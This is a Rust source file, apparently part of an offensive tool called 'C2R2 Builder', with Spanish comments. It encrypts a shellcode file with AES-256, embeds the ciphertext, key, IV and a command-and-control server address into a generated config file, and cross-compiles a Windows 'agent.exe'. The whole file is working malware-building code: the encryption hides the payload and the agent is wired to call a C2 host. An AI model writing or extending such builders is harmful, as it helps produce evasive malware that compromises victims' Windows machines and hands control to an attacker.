// File: src/encrypt.rs
// Función para encriptar shellcode en AES-256


use aes::Aes256;
use cbc::{
    cipher::{block_padding::Pkcs7, BlockEncryptMut, KeyIvInit},
    Encryptor,
};
use rand::RngCore;
use std::fs::File;
use std::io::{Read, Write};
use std::process::Command;

type Aes256CbcEnc = Encryptor<Aes256>;

const KEY_SIZE: usize = 32; // AES-256
const IV_SIZE: usize = 16; // AES block size

pub fn encrypt_shellcode(shellcode: &[u8]) -> (Vec<u8>, Vec<u8>, Vec<u8>) {
    // Generate random key
    let mut key = vec![0u8; KEY_SIZE];
    rand::thread_rng().fill_bytes(&mut key);

    // Generate random IV
    let mut iv = vec![0u8; IV_SIZE];
    rand::thread_rng().fill_bytes(&mut iv);

    // Preparar buffer con padding
    let block_size = 16;
    let padding = block_size - (shellcode.len() % block_size);
    let padded_len = shellcode.len() + padding;
    let mut buffer = vec![0u8; padded_len];
    buffer[..shellcode.len()].copy_from_slice(shellcode);

    // Encrypt
    let cipher = Aes256CbcEnc::new_from_slices(&key, &iv).unwrap();
    let encrypted = cipher
        .encrypt_padded_mut::<Pkcs7>(&mut buffer, shellcode.len())
        .unwrap();

    (encrypted.to_vec(), key, iv)
}

pub fn generate_agent(
    shellcode_file: &str,
    output_name: &str,
    c2_server: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    // Read the shellcode file
    let mut file = File::open(shellcode_file)?;
    let mut shellcode = Vec::new();
    file.read_to_end(&mut shellcode)?;

    println!("📊 Tamaño del shellcode: {} bytes", shellcode.len());

    // Encrypt the shellcode
    let (encrypted_data, key, iv) = encrypt_shellcode(&shellcode);

    println!("🔒 Shellcode encriptado: {} bytes", encrypted_data.len());

    // Detectar si estamos en target/release/
    let agent_path = if std::env::current_dir()?
        .to_string_lossy()
        .contains("target/release")
    {
        "../../agent"
    } else {
        "agent"
    };

    // Crear directorios si no existen
    let config_dir = format!("{}/src", agent_path);
    std::fs::create_dir_all(&config_dir)?;

    // Generar config.rs
    let config_file_path = format!("{}/src/config.rs", agent_path);
    let mut config_file = File::create(&config_file_path)?;

    writeln!(
        config_file,
        "// Generado automáticamente por C2R2 Builder"
    )?;
    writeln!(
        config_file,
        "pub const ENCRYPTED_SHELLCODE: &[u8] = &{:?};",
        encrypted_data
    )?;
    writeln!(config_file, "pub const KEY: &[u8] = &{:?};", key)?;
    writeln!(config_file, "pub const IV: &[u8] = &{:?};", iv)?;
    writeln!(
        config_file,
        "pub const C2_SERVER: &str = \"{}\";",
        c2_server
    )?;

    println!("✅ Configuración escrita en {}", config_file_path);
    println!("🌐 Servidor C2 configurado: {}", c2_server);

    // Compilar el agente
    println!("🔧 Compilando agente para Windows...");
    let output = Command::new("cargo")
        .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
        .current_dir(agent_path)
        .output()?;

    if output.status.success() {
        println!("✅ Compilación exitosa!");
        let exe_path = format!(
            "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
            agent_path
        );
        println!("🏃 Ejecutable generado en {}", exe_path);

        // Copiar ejecutable
        let dest_path = format!("{}.exe", output_name);
        if std::fs::copy(&exe_path, &dest_path).is_ok() {
            println!("📦 Ejecutable copiado como: {}", dest_path);
        } else {
            println!(
                "⚠️  No se pudo copiar el ejecutable, está en: {}",
                exe_path
            );
        }
    } else {
        println!("❌ Error durante la compilación:");
        println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
        return Err("Compilación fallida".into());
    }

    Ok(())
}